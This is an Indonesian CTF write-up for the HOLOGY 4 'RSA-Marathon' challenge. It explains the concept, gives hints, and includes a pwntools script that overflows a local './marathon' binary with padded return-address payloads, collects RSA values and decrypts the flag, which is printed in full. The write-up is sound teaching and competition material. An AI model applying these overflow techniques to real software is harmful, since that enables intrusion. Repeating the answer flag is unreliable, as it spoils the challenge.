# RSA-Marathon (214 Pts)

- [RSA-Marathon](#rsa-marathon)
- [Deskripsi](#deskripsi)
- [Konsep soal](#konsep-soal)
- [HINT](#hint)
- [Proof of Concept](#proof-of-concept)
- [Refrensi](#refrensi)

## Deskripsi
Jadilah juara di perlombaan marathon HOLOGY !!!

Author : **Dolf7**

Format Flag : Hology4{}

## Konsep soal
- Buffer Overflow
- Buffer Overwrite
- RSA Kriptografi
  
Mencari Overflow dan menuju alamat fungsi yang ada sesuai urutan soal. Jika sampai di akhir maka akan mendapatkan beberapa petunjuk flag berupa komponen dari RSA yang dapat di dekripsi untuk mendapat flag 


## HINT
1. Dapatkan petanya terlebih dahulu
2. Perhatikan kemana kamu pergi, jangan sampai tersesat
3. Berlari lebih dari yang diminta, akan sangat membantu mu
   
## Proof of Concept
```
#!usr/bin/env python3
from pwn import *
from Crypto.Util.number import *

p = process('./marathon')
load0 = 0xc0debeef
x = b'A'*10 + p32(load0)
p.sendline(x)
p.recvuntil(b"e ")
e = p.recvline()
e = int(e, 16)

p.recvuntil(b"n ")
n = p.recvline()[:-1]
n = int(n, 16)

p.recvuntil(b"c ")
c = p.recvline()[:-1]
c = int(c, 16)

p.recvuntil(b"l ")
l = p.recvline()[:-1]
l = int(l, 16)

p.recvuntil(b"s ")
s = p.recvline()[:-1]
s = int(s, 16)

payload0 = b'A'*50 + p32(e)
payload1 = b'A'*132 + p32(l)
payload2 = b'A'*132 + p32(n)
payload3 = b'A'*68 + p32(s)
payload4 = b'A'*260 + p32(c)
p.recvuntil(b"Check point 0 \n")

p.sendline(payload0)
p.recvuntil(b'e= ')
e1 = p.recvline()

p.sendline(payload1)

p.sendline(payload2)
p.recvuntil(b'n= ')
n1 = p.recvline()

p.sendline(payload3)

p.sendline(payload4)
p.recvuntil(b'c= ')
c1 = p.recvline()

p.sendline(x)
p.sendline(payload0)
p.recvuntil(b'p= ')
p1 = p.recvline()

e = int(e1[:-1])
n = int(n1[:-1])
c = int(c1[:-1])
p = int(p1[:-1])
q = n//p

phi = (p-1) *(q-1)
d = inverse(e, phi)
m = pow(c, d, n)
y = str(hex(m)[2:])

print(bytes.fromhex(y).decode('ascii'))
```

ouput :
```
$ python3 solve.py 
[+] Starting local process './marathon': pid 10802
hology4{F1ni5h_H0l0GY4_M4rath0n_Ch4mp10n}
[*] Process './marathon' stopped with exit code 0 (pid 10802)
```

Flag : hology4{F1ni5h_H0l0GY4_M4rath0n_Ch4mp10n}

## Refrensi
Tidak ada
